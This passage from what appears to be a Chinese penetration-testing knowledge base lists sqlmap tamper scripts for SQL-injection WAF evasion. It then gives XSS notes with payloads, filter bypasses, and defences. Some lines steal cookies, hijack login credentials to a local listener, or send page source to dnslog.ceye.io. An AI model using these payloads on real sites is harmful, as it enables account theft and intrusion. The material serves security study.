payload)'34=&Xe=&90=&Ni=&rW=&lc=&te=&T4=&zO=&NY=&B4=&hM=&X2=&pU=&D8=&hm=&p0=&7y=&18=&RK=&Xi=&5M=&vM=&hO=&bg=&5c=&b8=&dE=&7I=&5I=&90=&R2=&BK=&bY=&p4=&lu=&po=&Vq=&bY=&3c=&ps=&Xu=&lK=&3Q=&7s=&pq=&1E=&rM=&FG=&vG=&Xy=&tQ=&lm=&rO=&pO=&rO=&1M=&vy=&La=&xW=&f8=&du=&94=&vE=&9q=&bE=&lQ=&JS=&NQ=&fE=&RO=&FI=&zm=&5A=&lE=&DK=&x8=&RQ=&Xw=&LY=&5S=&zi=&Js=&la=&3I=&r8=&re=&Xe=&5A=&3w=&vs=&zQ=&1Q=&HW=&Bw=&Xk=&LU=&Lk=&1E=&Nw=&pm=&ns=&zO=&xq=&7k=&v4=&F6=&Pi=&vo=&zY=&vk=&3w=&tU=&nW=&TG=&NM=&9U=&p4=&9A=&T8=&Xu=&xa=&Jk=&nq=&La=&lo=&zW=&xS=&v0=&Z4=&vi=&Pu=&jK=&DE=&72=&fU=&DW=&1g=&RU=&Hi=&li=&R8=&dC=&nI=&9A=&tq=&1w=&7u=&rg=&pa=&7c=&zk=&rO=&xy=&ZA=&1K=&ha=&tE=&RC=&3m=&r2=&Vc=&B6=&9A=&Pk=&Pi=&zy=&lI=&pu=&re=&vS=&zk=&RE=&xS=&Fs=&x8=&Fe=&rk=&Fi=&Tm=&fA=&Zu=&DS=&No=&lm=&lu=&li=&jC=&Do=&Tw=&xo=&zQ=&nO=&ng=&nC=&PS=&fU=&Lc=&Za=&Ta=&1y=&lw=&pA=&ZW=&nw=&pM=&pa=&Rk=&lE=&5c=&T4=&Vs=&7W=&Jm=&xG=&nC=&Js=&xM=&Rg=&zC=&Dq=&VA=&Vy=&9o=&7o=&Fk=&Ta=&Fq=&9y=&vq=&rW=&X4=&1W=&hI=&nA=&hs=&He=&No=&vy=&9C=&ZU=&t6=&1U=&1Q=&Do=&bk=&7G=&nA=&VE=&F0=&BO=&l2=&BO=&7o=&zq=&B4=&fA=&lI=&Xy=&Ji=&lk=&7M=&JG=&Be=&ts=&36=&tW=&fG=&T4=&vM=&hG=&tO=&VO=&9m=&Rm=&LA=&5K=&FY=&HW=&7Q=&t0=&3I=&Du=&Xc=&BS=&N0=&x4=&fq=&jI=&Ze=&TQ=&5i=&T2=&FQ=&VI=&Te=&Hq=&fw=&LI=&Xq=&LC=&B0=&h6=&TY=&HG=&Hw=&dK=&ru=&3k=&JQ=&5g=&9s=&HQ=&vY=&1S=&ta=&bq=&1u=&9i=&DM=&DA=&TG=&vQ=&Nu=&RK=&da=&56=&nm=&vE=&Fg=&jY=&t0=&DG=&9o=&PE=&da=&D4=&VE=&po=&nm=&lW=&X0=&BY=&NK=&pY=&5Q=&jw=&r0=&FM=&lU=&da=&ls=&Lg=&D8=&B8=&FW=&3M=&zy=&ho=&Dc=&HW=&7E=&bM=&Re=&jk=&Xe=&JC=&vs=&Ny=&D4=&fA=&DM=&1o=&9w=&3C=&Rw=&Vc=&Ro=&PK=&rw=&Re=&54=&xK=&VK=&1O=&1U=&vg=&Ls=&xq=&NA=&zU=&di=&BS=&pK=&bW=&Vq=&BC=&l6=&34=&PE=&JG=&TA=&NU=&hi=&T0=&Rs=&fw=&FQ=&NQ=&Dq=&Dm=&1w=&PC=&j2=&r6=&re=&t2=&Ry=&h2=&9m=&nw=&X4=&vI=&rY=&1K=&7m=&7g=&J8=&Pm=&RO=&7A=&fO=&1w=&1g=&7U=&7Y=&hQ=&FC=&vu=&Lw=&5I=&t0=&Na=&vk=&Te=&5S=&ZM=&Xs=&Vg=&tE=&J2=&Ts=&Dm=&Ry=&FC=&7i=&h8=&3y=&zk=&5G=&NC=&Pq=&ds=&zK=&d8=&zU=&1a=&d8=&Js=&nk=&TQ=&tC=&n8=&Hc=&Ru=&H0=&Bo=&XE=&Jm=&xK=&r2=&Fu=&FO=&NO=&7g=&PC=&Bq=&3O=&FQ=&1o=&5G=&zS=&Ps=&j0=&b0=&RM=&DQ=&RQ=&zY=&nk=&1 AND 2>1' misunion.py UNION修改为-.1UNION >>> tamper('1 UNION ALL SELECT')'1-.1UNION ALL SELECT'>>> tamper('1\" UNION ALL SELECT')'1\"-.1UNION ALL SELECT' modsecurityversioned.py 包含带有 (MySQL) 版本化注释的完整查询 >>> tamper('1 AND 2>1--')'1 /*!30963AND 2>1*/--' modsecurityzeroversioned.py 包含带有（MySQL）零版本注释的完整查询 >>> tamper('1 AND 2>1--')'1 /*!00000AND 2>1*/--' multiplespaces.py 在sql关键字周围添加多个空格 >>> tamper('1 UNION SELECT foobar')'1 UNION SELECT foobar' overlongutf8.py 将给定的有效载荷中的所有（非字母）字符转换为超长 UTF8（不处理已经编码的）（例如 ' -> %C0%A7） >>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')'SELECT%C0%A0FIELD%C0%A0FROM%C0%A0TABLE%C0%A0WHERE%C0%A02%C0%BE1' overlongutf8more.py 将给定负载中的所有字符转换为超长 UTF8（未处理已编码）（例如 SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94） >>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')'%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94%C0%A0%C1%86%C1%89%C1%85%C1%8C%C1%84%C0%A0%C1%86%C1%92%C1%8F%C1%8D%C0%A0%C1%94%C1%81%C1%82%C1%8C%C1%85%C0%A0%C1%97%C1%88%C1%85%C1%92%C1%85%C0%A0%C0%B2%C0%BE%C0%B1' percentage.py 在每一个字符前面添加一个百分比符号 >>> tamper('SELECT FIELD FROM TABLE')'%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E' plus2concat.py 用对应的 (MsSQL) 函数 CONCAT() 代替加号运算符('+')。 >>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')'SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL'>>> tamper('1 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113)+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)-- qtfe')'1 UNION ALL SELECT NULL,NULL,CONCAT(CHAR(113),CHAR(118),CHAR(112),CHAR(112),CHAR(113),ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)),CHAR(113),CHAR(112),CHAR(107),CHAR(112),CHAR(113))-- qtfe' plus2fnconcat.py 将加号运算符 ('+') 替换为 (MsSQL) ODBC 函数 {fn CONCAT()} 对应项 >>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')'SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL'>>> tamper('1 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113)+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)-- qtfe')'1 UNION ALL SELECT NULL,NULL,{fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT(CHAR(113),CHAR(118))},CHAR(112))},CHAR(112))},CHAR(113))},ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)))},CHAR(113))},CHAR(112))},CHAR(107))},CHAR(112))},CHAR(113))}-- qtfe' randomcase.py 字符替换成大小写字符 >>> tamper('INSERT')'InSeRt'>>> tamper('f()')'f()'>>> tamper('function()')'FuNcTiOn()'>>> tamper('SELECT id FROMuser')'SeLeCt id FrOmuser' randomcomments.py 在关键字添加内联注释 /**/ >>> tamper('INSERT')'I/**/NS/**/ERT' schemasplit.py 将 FROM 模式标识符（如 testdb.users ）与空白处分割（如 testdb 9.e.users ）。 >>> tamper('SELECT id FROM testdb.users')'SELECT id FROM testdb 9.e.users' sleep2getlock.py 用 GET_LOCK('ETgP',5) 取代 SLEEP(5) >>> tamper('SLEEP(5)') == \"GET_LOCK('%s',5)\" % kb.aliasNameTrue sp_password.py 将 sp_password 附加到有效负载的末尾，用来混淆 >>> tamper('1 AND 9227=9227-- ')'1 AND 9227=9227-- sp_password' space2comment.py 空格替换成/**/ >>> tamper('SELECT id FROM users')'SELECT/**/id/**/FROM/**/users' space2dash.py 用一个注释（'--'）代替空格字符（''），后面是一个随机字符串和一个新行（'/n'）。 >>> tamper('1 AND 9227=9227')'1--upgPydUzKpMX%0AAND--RcDKhIr%0A9227=9227' space2hash.py 用（'#'）字符替换（MySQL）空格字符（''）的实例，后面是一个随机字符串和一个新行（'/n'）。 >>> tamper('1 AND 9227=9227')'1%23upgPydUzKpMX%0AAND%23RcDKhIr%0A9227=9227' space2morecomment.py 空格替换成/**_**/ >>> tamper('SELECT id FROM users')'SELECT/**_**/id/**_**/FROM/**_**/users' space2morehash.py 用（'#'）字符替换（MySQL）空格字符（''）的实例，后面是一个随机字符串和一个新行（'/n'）。 >>> tamper('1 AND 9227=9227')'1%23RcDKhIr%0AAND%23upgPydUzKpMX%0A%23lgbaxYjWJ%0A9227=9227' space2mssqlblank.py 将(MsSQL)空格字符('')的实例替换为一个有效的备用字符集中的随机空白字符。 >>> tamper('SELECT id FROM users')'SELECT%0Did%0DFROM%04users' space2mssqlhash.py 将空格替换成 %23%0A >>> tamper('1 AND 9227=9227')'1%23%0AAND%23%0A9227=9227' space2mysqlblank.py 将(MySQL)空格字符('')的实例替换为有效替代字符集中的随机空白字符 >>> tamper('SELECT id FROM users')'SELECT%A0id%0CFROM%0Dusers' space2mysqldash.py 用注释（'--'）代替空格字符（''），后面是一个新行（'/n'）。 >>> tamper('1 AND 9227=9227')'1--%0AAND--%0A9227=9227' space2plus.py 将空格替换成 + >>> tamper('SELECT id FROM users')'SELECT+id+FROM+users' space2randomblank.py 用一组有效的备用字符中的随机空白字符替换空格字符（''）。 >>> tamper('SELECT id FROM users')'SELECT%0Did%0CFROM%0Ausers' substring2leftright.py 用 LEFT 和 RIGHT 取代 PostgreSQL 的 SUBSTRING >>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 1 FOR 1)')'LEFT((SELECT usename FROM pg_user)::text,1)'>>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 3 FOR 1)')'LEFT(RIGHT((SELECT usename FROM pg_user)::text,-2),1)' symboliclogical.py 将 and 和 or 的逻辑运算符分别替换为 (&& 和 ` `) unionalltounion.py 将 union all select 替换成 union select >>> tamper('-1 UNION ALL SELECT')'-1 UNION SELECT' unmagicquotes.py 用多字节组合 %BF%27 代替引号字符(')，并在结尾处加上通用注释(以使其发挥作用) >>> tamper(\"1' AND 1=1\")'1%bf%27-- -' uppercase.py 将关键字符替换成大写 >>> tamper('insert')'INSERT' varnish.py 附加一个HTTP头来 X-originating-IP = \"127.0.0.1\" 来绕过防火墙 >> X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)>> X-remote-IP: TARGET_PROXY_IP (184.189.250.X)>> X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)>> x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)>> X-remote-IP: * or %00 or %0A versionedkeywords.py 用(MySQL)版本注释包围每个非功能关键词 >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')'1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#' versionedmorekeywords.py 用(MySQL)的版本注释包围每个关键词 >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#')'1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#' xforwardedfor.py 附加多个虚假的 HTTP IP头 headers[\"X-Forwarded-For\"] = randomIP()headers[\"X-Client-Ip\"] = randomIP()headers[\"X-Real-Ip\"] = randomIP()headers[\"CF-Connecting-IP\"] = randomIP()headers[\"True-Client-IP\"] = randomIP()headers[\"Via\"] = \"1.1 Chrome-Compression-Proxy\"headers[\"CF-IPCountry\"] = random.sample(('GB', 'US', 'FR', 'AU', 'CA', 'NZ', 'BE', 'DK', 'FI', 'IE', 'AT', 'IT', 'LU', 'NL', 'NO', 'PT', 'SE', 'ES', 'CH'), 1)[0] Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:08 "},"个人知识库/01.渗透测试/02.WEB漏洞/02.XSS/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/02.XSS/","title":"02.XSS","keywords":"","body":" 定义 危害 XSS分类 反射型XSS 存储型XSS DOM型XSS 各XSS区别 基础对比 反射型XSS与DOM型XSS区别 XSS与CSRF的区别 XSS挖掘 黑盒测试 白盒测试 常见业务场景 常见Payload 速查表 探测器 常用基础payload 基于标签 基于事件 基于伪协议 MarkDown XSS XML XSS 获取Cookie手法 登陆劫持手法 输入就弹窗 修改表单的action 跳转的登陆劫持 获取敏感数据 发送xhr请求获取数据 获取当前页面源码 绕过 常规手法 通用编码手法 通过eval函数 绕过 绕过关键词过滤 绕过空格过滤 绕过javascript过滤 绕过括号()过滤 绕过长度限制 利用JS全局变量绕过 常规防御 输入检查 输出编码 使用httponly 使用CSP 特殊防御 富文本编辑器XSS修复 URL可控 JSONP 定义 跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许攻击者将恶意代码注入到前端网页上，其他用户在浏览网页时就会执行恶意代码而受到影响。 [!NOTE] 跨站脚本本来的缩写为CSS，但为了与层叠样式表（Cascading Style Sheets，CSS）的缩写进行区分，因此将跨站脚本攻击缩写为XSS [!TIP] 既然是代码注入，那肯定也是在某些地方执行了特定的代码 本质是攻击者在web页面插入恶意的script代码（这个代码可以是JS脚本、CSS样式或者其他意料之外的前端代码），当用户浏览该页面之时，嵌入其中的script代码会被执行，从而达到恶意攻击用户的目的。比如读取cookie，session，tokens，或者网站其他敏感的网站信息，对用户进行钓鱼欺诈等 [!NOTE] 多说一句，这个漏洞是客户端的问题，基本上对服务端不会造成影响，主要是影响客户端，也就是影响用户的漏洞 危害 盗取身份信息，窃取会话Cookie从而窃取网站用户隐私、包括账户、浏览历史、IP等 未授权操作，通过JS发起敏感操作请求 按键记录和钓鱼 更广泛的蠕虫传播，借助网站进行传播，使网站的使用用户受到攻击。 劫持用户会话，从而知悉任意操作，比如弹窗跳转、篡改页面、网页挂马。 [!NOTE] 个人感觉最重要的有两点： 获取敏感数据，如cookie、个人信息等 发起敏感操作，如修改密码、新建工单等 简而言之，就是所有js能做到的事，它都能做到 XSS分类 XSS主要分为三类： 反射型XSS 存储型XSS DOM型XSS 其中反射型、DOM-based型可以归类为非持久型XSS攻击，存储型归类为持久型XSS攻击 反射型XSS [!NOTE] payload不会存到数据库中，一般出现在查询页面（输入内容会直接返回的参数都可能存在反射型XSS） 反射型XSS，又称非持久型XSS，攻击相对于受害者而言是一次性的 攻击者诱导受害者点击包含恶意JavaSctipt代码的URL，当受害者点击这些精心设计的链接后，恶意代码会直接在受害者主机上的浏览器执行；恶意代码并没有保存在目标网站，而Web应用程序只是不加处理的把该恶意脚本“反射”回受害者的浏览器而使受害者的浏览器执行相应的脚本 一图胜千言 具体攻击流程如下： 攻击者将payload放置在url链接中（这是针对是GET型反射XSS） 用户点击该恶意链接 web服务将XSS代码（JavaScript代码）以及视图返回给客户端 客户端解析视图以及XSS代码（JavaScript代码），并将执行结果发送到XSS平台 攻击者访问XSS平台，读取用户的敏感信息（Cookie） 存储型XSS [!NOTE] payload会存在数据库里面，一般出现在会将数据存储到数据库中并展示在前端页面的功能，如注册页、留言板等 存储型XSS是指应用程序将存在XSS payload的数据未进行过滤检查便存入到数据库中，当下一次从数据库中获取该数据时程序也未对其进行过滤，直接将其展示在前端，页面将会执行XSS payload攻击用户。 攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。 存储型XSS漏洞大多出现在留言板、评论区等会存放到数据库中且会在某些地方展示该数据的功能点，用户提交了包含XSS代码的留言到数据库，当目标用户查询留言时，那些留言的内容会直接返回到前端并执行恶意的XSS payload 具体攻击流程如下： 攻击者向web服务插入XSS代码 web服务会将其结果存储到数据库中 用户正常访问web服务 web服务将数据库的数据以及视图返回给前端，前端渲染视图并加载数据，其中数据里包含恶意XSS代码（JavaScript代码） 客户端渲染视图，加载XSS代码，并向攻击者的web服务发送敏感信息 攻击者读取用户的敏感信息 DOM型XSS [!NOTE] 不与后端服务器交互数据，payload不会存到数据库中，也属于反射型的一种，通过dom操作前端输出的时候产生问题（相比于前两种较难挖掘，需要熟悉基础的js代码） DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式 客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从URL中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的JavaScript脚本，而这些脚本没有经过过滤，那么应用程序就可能受到DOM-based XSS攻击。 需要特别注意以下的用户输入源 document.URL、location.hash、location.search、document.referrer 等 具体攻击流程如下： 攻击者将payload放置在url链接中（这是针对是GET型反射XSS） 用户点击恶意链接，并打开浏览器 此时浏览器客户端并不会发起http请求到web服务，而是在浏览器客户端执行XSS（JavaScript代码） 此时将XSS代码执行结果发送给攻击者的恶意服务 攻击者访问自己的XSS平台并读取用户的敏感信息 各XSS区别 基础对比 反射型 存储型 DOM型 攻击对象 需要攻击者主动寻找受害者并诱导其访问 广撒网，只要有用户访问对应的页面就会触发，危害性更大，范围更广 需要攻击者主动寻找受害者并诱导其访问（同反射型） 持久性 一次性 只要服务器不宕机，payload不被手动删除，就一直存在 一次性 触发点 网站中直接返回参数内容的功能点 网站中将数据直接存储到数据库中，后直接返回数据在前端展示的功能点 取决于DOM节点 反射型XSS与DOM型XSS区别 1、反射型XSS攻击中，服务器在返回HTML文档的时候，就已经包含了恶意的脚本; 2、DOM型ⅩSS攻击中，服务器在返回HTML文档的时候，是不包含恶意脚本的；恶意脚本是在浏览器执行了正常脚本后，才被注入到文档里的 [!TIP] 一句话区分：反射型XSS可以直接在服务端返回的html中看到payload，而DOM型XSS不行 XSS与CSRF的区别 面试常问 类别 特征 XSS 1、主要是加载JavaScript代码，在客户端执行2、虽然经过后端，数据库（存储型），但主要需要客户端执行XSS代码，才能生效3、DOM型XSS一定不经过后端，只是对浏览器客户端发起的攻击4、XSS攻击针对的是用户层面的攻击 （攻击客户端） CSRF 1、主要是欺骗服务器，虽然是由用户发起，但是服务器无法判断是否是不是用户想要发起的请求2、一定会经过后端处理，不然无法执行3、CSRF是一种身份伪造攻击，来对服务器进行欺骗的一种攻击手法 XSS挖掘 黑盒测试 分析数据包，所有可控参数都可以输入payload进行尝试，一般可以先输入一些常规标签如h1、img等进行确认 直接返回输入内容就可能存在反射型XSS 在页面中进行特定渲染则可能存在DOM型XSS 直接存储到数据库中则可能存在存储型XSS 当然这些都需要后期的二次确认 有时候也可将返回页面中的一些关键词进行构造参数拼接，再进行如上的检查，如以下html代码： var imgErrorLen=0; 此时就可以尝试构造参数 imgErrorLen=123&ie=123 拼接 [!TIP] 可以维护一个XSS的Fuzz字典，这样可以快速辅助发现XSS漏洞，不需要一个一个手动去输入 白盒测试 关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。 PHP中常见的接收参数的方式有$_GET、$_POST、$_REQUEST等等，可以搜索所有接收参数的地方，然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。 也可以搜索类似echo这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。 大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。 同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。 常见业务场景 重灾区：评论区、留言区、个人信息、订单信息等 针对型：站内信、网页即时通讯、私信、意见反馈 存在风险：搜索框、当前目录、图片属性、自定义头像链接等 常见Payload XSS主要是针对浏览器客户端的一种攻击，需要执行JavaScript代码，那么无疑需要使用到JavaScript语言以及在HTML中可以加载JavaScript的标签 速查表 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 探测器 快速查看过滤了哪些字符 '';!--\"=&{()} 常用基础payload 基于标签 --!> nmask 你可以点击我触发 // 123 \"> a=prompt;a(1) alert(\"xss\");;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; window.a==1?1:prompt(a=1) a 基于事件 上面基于标签中也有很多基于事件的了，遇到可以用事件的也可以参考下上面的事件 onclick=document.write(document.cookie) self[Object.keys(self)[5]](\"foo\") // alert(\"foo\") constructor.constructor(alert(1)) eval('alert(1)') [1].find(alert); [self.alert(1)] top['al\\x65rt'](2); top[\"al\"+\"ert\"](3); setTimeout('ale'+'rt(4)'); Function(\"ale\"+\"rt(5)\")(); new Function`al\\ert\\`6\\``; setInterval('ale'+'rt(7)'); top[/al/.source+/ert/.source](9); open('java'+'script:ale'+'rt(10)'); top[8680439..toString(30)](8); // 使用parseInt(\"alert\",30)生成 self[9350252032..toString(30)](1) // confirm(1) 除了常见的一些事件onerror、onclick等之外，js还有很多的事件，参考如下： https://developer.mozilla.org/zh-CN/docs/Web/Events https://www.w3schools.cn/jsref/dom_obj_event.asp 基于伪协议 如果URL跳转的地址可控，且存在于标签中，就可以利用伪协议来XSS javascript://www.baidu.com/%E2%80%A8alert(1) javascript:location.href='http://127.0.0.1:8999/username='+document.getElementsByName('username')[1]._value+'&password='+document.getElementsByName('password')[1]._value MarkDown XSS 列举几个，可以需要的时候github再去找 [a](javascript:prompt(document.cookie)) [a](j a v a s c r i p t:prompt(document.cookie)) ![a'\"`onerror=prompt(document.cookie)](x) [notmalicious](javascript:window.onerror=alert;throw%20document.cookie) [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=) ![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=) ... XML XSS alert(1) 获取Cookie手法 登陆劫持手法 如果遇到登录页面存在XSS，那么就可以通过一些特殊的js代码来获取账号密码等，达到登陆劫持的目的 举一些例子，可以根据实际情况修改 输入就弹窗 var input = document.getElementById('1') input.oninput = function(){ alert(input.value); } 修改表单的action 跳转的登陆劫持 如果跳转的链接可控，也可以劫持到数据 redirectUrl=javascript:location.href='http://127.0.0.1:8999/username='+document.getElementsByName('username')[1]._value+'&password='+document.getElementsByName('password')[1]._value 获取敏感数据 发送xhr请求获取数据 通过xhr来获取敏感数据，有jquery更简单，只不过xhr比较通用 # 纯js请求获取token -> 正则表达式 xhr=new XMLHttpRequest(); xhr.open(\"GET\", \"https://m.gm7.org/\", true); xhr.send(); alert(\"TOKEN Jacking\"); //争取延时，readyState必须为4的时候才能获取源码，很烦 page = xhr.response; var tk_regex=new RegExp(\"\\\\\\\"CSTK\\\\\\\":\\\\\\\".*?\\\\\\\"\"); alert(tk_regex.exec(page)[0]); 获取当前页面源码 var xmlhttp; if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari xmlhttp = new XMLHttpRequest(); } else { // code for IE6, IE5 xmlhttp = new ActiveXObject(\"Microsoft.XMLHTTP\"); } xmlhttp.open(\"POST\", \"http://dnslog.ceye.io/html_source\", true); xmlhttp.send(escape(document.location) + \"=\" + encodeURIComponent(document.getElementsByTagName('html')[0].innerHTML)); 绕过 常规手法 一切的绕过都需要尽量知道他的过滤规则，分析出来过滤规则了利用起来就方便多了 常规的一些手法： 编码 注释 大小写 双写 HPP参数污染 超长垃圾字符 通用编码手法 可以直接使用xss'or：https://evilcos.me/lab/xssor/ XSS'OR 编码后用在 on 事件之后 onerror=xss'or encode，也可以用到eval函数中 eval(\"xss'or encode\") eval(\"\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029\") 常用编码： 第一个，html实体编码，例如：&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x29; 第二个，进制类，例如：\\x61\\x6c\\x65\\x72\\x74\\x60\\x78\\x73\\x73\\x60，某些时候，也有不带x,例如：\\5c\\6a 第三个，Unicode，例如：\\u0061\\u006c\\u0065\\u0072\\u0074\\u0060\\u4e2d\\u6587\\u4e5f\\u53ef\\u4ee5\\u0060 第四个，纯转义，例如：\\' \\\" \\ ,这样的在特殊字符前加\\进行转义。 其他编码手法： jsfuck：http://www.jsfuck.com/ jjencode 通过eval函数 上面也提到了，算是举例子吧 # 十六进制 eval(\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x78\\x78\\x78\\x27\\x29\") # ASCII # 其他 eval(String.\\u0066\\u0072\\u006f\\u006d\\u0043\\u0068\\u0061\\u0072\\u0043\\u006f\\u0064\\u0065(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29)) 绕过 大多数网站在防御时，都会给输入的进行编码处理，让我们误认为不存在XSS，但是我们不清楚后端是如何处理的，可能输入一些特殊的编码会被后端解码呢？ 所以可以用如下的一些payload来遍历，看看有不有能让解码后使用的，达到我们XSS的目的 绕过关键词过滤 有些网站可能禁止使用一些关键词如document.cookie，可以通过如下的方式来绕过 document . cookie document/*xxx*/./*xxx*/cookie 绕过空格过滤 /**/ 可以替代空格 以及一些URL编码也可以代替空格 %0a %0d %09 %20 %00 绕过javascript过滤 javas\\rcript:self[Object.keys(self)[6]](sessionStorage.getItem('_diskSessionId'))// // http://example.com/redirect?url=javascript:alert() document.location = 'javasc\\tript:alert(123)' document.location = 'javasc\\rript:alert(123)' document.location = 'javasc\\nript:alert(123)' 绕过括号()过滤 alert`1` prompt`${document.cookie}` window.onerror=alert;throw 1 window.onerror=alert;throw 1 绕过长度限制 执行锚点后面的内容 location.hash 使用 import('//domain/file')，这个需要使用同样的协议，加载的js的响应头中的content-type为application/javascript而且允许跨域加载Access-Control-Allow-Origin: * 参考文章 特殊的unicode字符：https://www.fuhaoku.net/danweifuhao/ 利用JS全局变量绕过 全局变量 window self _self this top parent frames 一些payload，也可以参考 基于事件 window[\"document\"][\"cookie\"] window[\"alert\"](window[\"document\"][\"cookie\"]) self[\"alert\"](self[\"document\"/*xxx*/][\"cookie\"]) self[\"ale\"+\"rt\"](self[\"doc\"+\"ument\"][\"coo\"+\"kie\"]) self[\"\\x61\\x6c\\x65\\x72\\x74\"](self[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x63\\x6f\\x6f\\x6b\\x69\\x65\"]) self[\"\\x65\\x76\\x61\\x6c\"](self[\"\\x61\\x74\\x6f\\x62\"](\"ZG9jdW1lbnQuY29va2ll\")) // Jquery self[\"$\"][\"globalEval\"](\"alert(1)\") // 高级用法，不出现alert等关键词，遍历全局变量找到对应的函数 c=0; for(i in self) { if(i == \"alert\") { console.log(c); } c++; } // 先搜索到alert函数的id self[Object.keys(self)[5]](\"foo\") // alert(\"foo\") a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} // 正则表达式匹配出alert然后定义函数a为alert self[Object.keys(self)[a()]](\"foo\") 字符串转16进制(\\x格式的) import binascii result = [] a = input(\"\\t\\t: \") for i in a: result.append(binascii.b2a_hex(i.encode())) result = [i.decode() for i in result] result = \"\\\\x\".join(result) print (\"\\\\x\" + result) 常规防御 输入检查 1、假定所有输入都是可疑的，必须对所有输入中的、>、'、\"、on.*、script、iframe等字样进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等 常见过滤字符： 字符 说明 ｜ 西文竖线符号 & & 符号 ; 分号 $ 美元符号 % 百分比符号 @ at 符号 ' 单引号 \" 引号 \\' 反斜杠转义单引号 \\\" 反斜杠转义引号 <> 尖括号 () 括号 + 加号 CR 回车符，ASCII 0x0d LF 换行，ASCII 0x0a , 逗号 \\ 反斜杠 = 等号 2、验证用户输入的数据类型，数据长度，数据内容（最好客户端与服务端均进行验证，服务端验证是必须的） 如果数据类型为整型，则使用intval强制转换变量类型 如果用户输入是手机号，那么就需要判断是否是11位数字 如果数据内容为邮箱，则应使用正则取A-Za-z0-9.@-_范围内的值，其它字符则忽略掉 输出编码 对用户输入的不信任的内容均采用编码的方式输出到页面中，输出编码手段主要有3种编码： URL编码 HTML编码 JavaScript编码 常见需要编码的字符： & --> &amp; &lt; > --> &gt; \" --> &quot; ' --> &#x27; / --> &#x2F; 使用httponly HTTP-only Cookie：禁止JavaScript读取某些敏感Cookie，使得攻击者完成XSS注入后也无法成功窃取到Cookie [!WARNING] 